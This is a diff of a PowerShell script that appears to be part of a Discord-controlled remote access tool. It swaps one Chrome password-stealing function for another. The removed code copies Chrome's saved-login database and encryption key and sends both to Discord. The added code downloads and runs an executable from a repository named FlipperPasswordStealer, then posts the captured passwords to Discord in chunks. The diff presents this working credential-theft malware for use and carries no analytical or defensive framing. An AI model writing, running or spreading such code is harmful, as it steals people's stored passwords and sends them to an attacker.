@@ -784,34 +784,34 @@ param ([int[]]$t)
 
 # --------------------------------------------------------------- CHROMEPASS FUNCTION ------------------------------------------------------------------------
 
-Function Chromepass {
-    # File paths for Chrome login data and encryption key files
-    $sourceFile1 = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
-    $outputFile1 = "C:\ProgramData\output.txt"
-    $sourceFile2 = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
-    $outputFile2 = "C:\ProgramData\key.txt"
-
-    # Copy Chrome login data and encryption key files
-    Copy-Item -Path $sourceFile1 -Destination $outputFile1 -ErrorAction SilentlyContinue
-    Copy-Item -Path $sourceFile2 -Destination $outputFile2 -ErrorAction SilentlyContinue
-
-    # Check if files were copied successfully and send each file to Discord
-    if (Test-Path -Path $outputFile1) {
-        sendFile -sendfilePath $outputFile1
-        Remove-Item -Path $outputFile1 -Force
-        sendMsg -Message ":lock: ``Chrome Encrypted Login Data Sent`` :lock:"
-    } else {
-        sendMsg -Message ":warning: ``Chrome Login Data not found`` :warning:"
+function Chromepass {
+    # Define the download and execution details
+    $exeUrl = 'https://github.com/RiadZX/FlipperPasswordStealer/raw/master/build/chrome.exe'
+    $exePath = '.\chrome.exe'
+    
+    # Download the executable if it doesn't already exist
+    if (-not (Test-Path -Path $exePath)) {
+        Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
     }
-
-    if (Test-Path -Path $outputFile2) {
-        sendFile -sendfilePath $outputFile2
-        Remove-Item -Path $outputFile2 -Force
-        sendMsg -Message ":key: ``Chrome Key File Sent`` :key:"
-    } else {
-        sendMsg -Message ":warning: ``Chrome Key File not found`` :warning:"
+    
+    # Run the executable and capture output
+    $commandOutput = & $exePath | Out-String
+    
+    # Split the output into chunks for sending
+    $chunks = [Math]::Ceiling($commandOutput.Length / 2000)
+    for ($i = 0; $i -lt $chunks; $i++) {
+        $start = $i * 2000
+        $length = [Math]::Min(2000, $commandOutput.Length - $start)
+        $content = $commandOutput.Substring($start, $length)
+        
+        # Send each chunk through the bot's message function
+        sendMsg -Message ":lock: Chrome Passwords: $content"
+        
+        # Delay to prevent rate limiting
+        Start-Sleep -Seconds 1
     }
 }
+
 
 
 # --------------------------------------------------------------- ADMIN FUNCTIONS ------------------------------------------------------------------------
